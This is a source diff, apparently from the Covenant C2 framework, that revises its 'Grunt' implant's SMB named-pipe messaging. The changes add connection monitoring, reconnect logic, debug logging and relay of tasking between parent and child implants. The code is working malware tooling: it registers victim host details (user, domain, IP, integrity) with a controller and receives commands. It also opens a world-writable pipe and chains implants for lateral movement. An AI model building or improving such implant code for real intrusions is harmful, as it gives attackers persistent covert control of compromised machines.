@@ -72,7 +72,7 @@ namespace GruntExecutor
                 string UserName = Environment.UserName;
 
                 string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""hostname"": """ + Hostname + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
-                IMessenger baseMessenger = new ServerSMBMessenger(ServerPipe, PipeName);
+                ServerSMBMessenger baseMessenger = new ServerSMBMessenger(ServerPipe, PipeName);
                 baseMessenger.Identifier = GUID;
                 TaskingMessenger messenger = new TaskingMessenger
                 (
@@ -80,7 +80,8 @@ namespace GruntExecutor
                     baseMessenger,
                     new Profile(ProfileReadFormat, ProfileWriteFormat, GUID)
                 );
-                ((ServerSMBMessenger)baseMessenger).Messenger = messenger;
+                baseMessenger.Messenger = messenger;
+                baseMessenger.Start();
                 messenger.QueueTaskingMessage(RegisterBody);
                 messenger.WriteTaskingMessage();
                 messenger.SetAuthenticator(messenger.ReadTaskingMessage().Message);
@@ -107,6 +108,7 @@ namespace GruntExecutor
                         GruntTaskingMessage message = messenger.ReadTaskingMessage();
                         if (message != null)
                         {
+                            Console.WriteLine("Received command");
                             ConnectAttemptCount = 0;
                             string output = "";
                             if (message.Type == GruntTaskingType.SetDelay || message.Type == GruntTaskingType.SetJitter || message.Type == GruntTaskingType.SetConnectAttempts)
@@ -477,6 +479,7 @@ namespace GruntExecutor
             }
             else
             {
+                Console.WriteLine("Received C2 message for SMB Grunt.");
                 string json = this.Crafter.Retrieve(gruntMessage);
                 GruntEncryptedMessage wrappedMessage = GruntEncryptedMessage.FromJson(json);
                 IMessenger relay = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier == wrappedMessage.GUID);
@@ -531,32 +534,42 @@ namespace GruntExecutor
             }
 
             ClientSMBMessenger downstream = new ClientSMBMessenger(Hostname, PipeName);
+            downstream.Connect();
             Thread readThread = new Thread(() =>
             {
-                while (downstream.ActivePipe)
+                while (downstream.IsConnected)
                 {
                     try
                     {
+                        Console.WriteLine("Connect - Wait for SMB data");
                         ProfileMessage read = downstream.Read();
-                        if (downstream.Identifier == "")
+                        Console.WriteLine("Connect - Received SMB data");
+                        if (read != null && !string.IsNullOrEmpty(read.Message))
                         {
-                            GruntEncryptedMessage message = this.Profile.ParseWriteFormat(read.Message);
-                            if (message.GUID.Length == 20)
+                            if (string.IsNullOrEmpty(downstream.Identifier))
                             {
-                                downstream.Identifier = message.GUID.Substring(10);
+                                GruntEncryptedMessage message = this.Profile.ParseWriteFormat(read.Message);
+                                if (message.GUID.Length == 20)
+                                {
+                                    downstream.Identifier = message.GUID.Substring(10);
+                                }
+                                else if (message.GUID.Length == 10)
+                                {
+                                    downstream.Identifier = message.GUID;
+                                }
                             }
-                            else if (message.GUID.Length == 10)
-                            {
-                                downstream.Identifier = message.GUID;
-                            }
+                            Console.WriteLine("Connect - Write SMB data upstream");
+                            this.UpstreamMessenger.Write(read.Message);
                         }
-                        this.UpstreamMessenger.Write(read.Message);
                     }
                     catch (Exception e)
                     {
                         Console.Error.WriteLine("Thread Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                     }
                 }
+                // Connection became disconnected and therefore we remove the downstream object
+                this.DownstreamMessengers.Remove(downstream);
+                Console.WriteLine("SMB Pipe not active anymore.");
             });
             downstream.ReadThread = readThread;
             downstream.ReadThread.Start();
@@ -585,31 +598,48 @@ namespace GruntExecutor
 
         protected object _PipeLock = new object();
         private PipeStream _Pipe;
+        protected object _IsConnectedLock = new object();
+        private bool _IsConnected;
         protected string PipeName { get; } = null;
         public Thread ReadThread { get; set; } = null;
+        private Thread MonitoringThread { get; set; } = null;
+        // This flag syncs communication peers in case one of the them dies (see method Read and Write)
+        private bool IsServer;
 
-        public SMBMessengerBase(string Hostname, string Pipename)
+        public SMBMessengerBase(string Hostname, string Pipename, bool IsServer)
         {
             this.Hostname = Hostname;
             this.PipeName = Pipename;
-            this.CheckPipeState();
+            this.IsServer = IsServer;
         }
 
-        public SMBMessengerBase(PipeStream Pipe, string Hostname, string Pipename)
+        public SMBMessengerBase(PipeStream Pipe, string Hostname, string Pipename, bool IsServer)
         {
             this.Pipe = Pipe;
             this.Hostname = Hostname;
             this.PipeName = Pipename;
-            this.CheckPipeState();
+            this.IsServer = IsServer;
+            if (Pipe != null)
+            {
+                this.IsConnected = Pipe.IsConnected;
+                this.MonitorPipeState();
+            }
         }
 
-        public bool ActivePipe
+        public bool IsConnected
         {
             get
             {
-                lock (this._PipeLock)
+                lock (this._IsConnectedLock)
                 {
-                    return this._Pipe != null && this._Pipe.IsConnected;
+                    return this._IsConnected;
+                }
+            }
+            set
+            {
+                lock (this._IsConnectedLock)
+                {
+                    this._IsConnected = value;
                 }
             }
         }
@@ -632,17 +662,93 @@ namespace GruntExecutor
             }
         }
 
-        protected abstract void CheckPipeState();
+        protected abstract void ReCreatePipeState();
+
+        protected void MonitorPipeState()
+        {
+            this.MonitoringThread = new Thread(() =>
+            {
+                Console.WriteLine("MonitorPipeState - Monitoring started");
+                while (this.IsConnected)
+                {
+                    try
+                    {
+                        // Implement Jitter and Delay
+                        Thread.Sleep(1000);
+                        // Writing something to the pipe is the only non-blocking way for SMB servers to determine whether the pipe is still active.
+                        /*if (this.IsServer)
+                        {
+                            this.Write(string.Empty);
+                            Console.WriteLine("MonitorPipeState - WritePipe");
+                        }*/
+                        this.IsConnected = this._Pipe.IsConnected;
+                        if (!this.IsConnected)
+                        {
+                            Console.WriteLine("MonitorPipeState - Pipe closed");
+                            this.IsConnected = false;
+                            this._Pipe.Close();
+                            return;
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Grunt.LogException("MonitorPipeState", ex);
+                    }
+                }
+                Console.WriteLine("MonitorPipeState - Monitoring stopped");
+            });
+            this.MonitoringThread.IsBackground = true;
+            this.MonitoringThread.Start();
+        }
 
         public ProfileMessage Read()
         {
-            return new ProfileMessage { Type = MessageType.Read, Message = Common.GruntEncoding.GetString(this.ReadBytes()) };
+            ProfileMessage result = null;
+            try
+            {
+                // If the Grunt acts as SMB server, then it shall wait in the write method until the connection is re-established.
+                // This should avoid that both communication peers remain in the read method, which leads to a deadlock.
+                Console.WriteLine("SMBMessengerBase - Read");
+                if (this.IsServer)
+                    this.ReCreatePipeState();
+                if (this.IsConnected)
+                    this.ReCreatePipeState();
+                result = new ProfileMessage { Type = MessageType.Read, Message = Common.GruntEncoding.GetString(this.ReadBytes()) };
+            }
+            catch (IOException)
+            {
+            }
+            catch (NullReferenceException)
+            {
+            }
+            catch (ObjectDisposedException)
+            {
+            }
+            return result;
+
         }
 
         public void Write(string Message)
         {
-            this.CheckPipeState();
-            this.WriteBytes(Common.GruntEncoding.GetBytes(Message));
+            try
+            {
+                // If the Grunt acts as SMB client, then it shall wait in the write method until the connection is re-established.
+                // This should avoid that both communication peers remain in the read method, which leads to a deadlock.
+                Console.WriteLine("SMBMessengerBase - Write");
+                if (!this.IsServer)
+                    this.ReCreatePipeState();
+                if (this.IsConnected)
+                    this.WriteBytes(Common.GruntEncoding.GetBytes(Message));
+            }
+            catch (IOException)
+            {
+            }
+            catch (NullReferenceException)
+            {
+            }
+            catch (ObjectDisposedException)
+            {
+            }
         }
 
         public void Close()
@@ -658,6 +764,7 @@ namespace GruntExecutor
                 }
                 catch (Exception) { }
                 this._Pipe = null;
+                this.IsConnected = false;
             }
         }
 
@@ -709,19 +816,30 @@ namespace GruntExecutor
     {
         private int Timeout { get; set; } = 5000;
 
-        public ClientSMBMessenger(string Hostname, string PipeName = "gruntsvc", int Timeout = 5000) : base(Hostname, PipeName)
+        public ClientSMBMessenger(string Hostname, string PipeName, int Timeout = 5000) : base(Hostname, PipeName, false)
         {
             this.Timeout = Timeout;
         }
 
-        protected override void CheckPipeState()
+        public void Connect()
         {
-            if (!this.ActivePipe)
+            this.ReCreatePipeState();
+            this.MonitorPipeState();
+        }
+
+        protected override void ReCreatePipeState()
+        {
+            if (!this.IsConnected)
             {
-                NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, this.PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
+                Console.WriteLine("Connecting");
+                NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
                 ClientPipe.Connect(Timeout);
                 ClientPipe.ReadMode = PipeTransmissionMode.Byte;
                 this.Pipe = ClientPipe;
+                this.IsConnected = true;
+                Console.WriteLine("Connection established");
+                // Start the pipe status monitoring thread
+                this.MonitorPipeState();
             }
         }
     }
@@ -730,18 +848,27 @@ namespace GruntExecutor
     {
         private PipeSecurity Security = new PipeSecurity();
         public TaskingMessenger Messenger { get; set; } = null;
-        public ServerSMBMessenger(NamedPipeServerStream ServerPipe, string Pipename) : base(ServerPipe, "localhost:" + Pipename, Pipename)
+        public ServerSMBMessenger(NamedPipeServerStream ServerPipe, string Pipename) : base(ServerPipe, string.Empty, Pipename, true)
         {
             Security.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
         }
 
-        protected override void CheckPipeState()
+        public void Start()
         {
-            if (!this.ActivePipe)
+            this.ReCreatePipeState();
+        }
+
+        protected override void ReCreatePipeState()
+        {
+            if (!this.IsConnected)
             {
+                Console.WriteLine("Listening");
                 NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, Security);
                 newServerPipe.WaitForConnection();
                 this.Pipe = newServerPipe;
+                Console.WriteLine("Connection established");
+                this.IsConnected = true;
+                this.MonitorPipeState();
                 // Tell the parent Grunt the GUID so that it knows to which child grunt which messages shall be forwarded. Without this message, any further communication breaks.
                 this.Messenger.QueueTaskingMessage(string.Empty);
                 this.Messenger.WriteTaskingMessage();
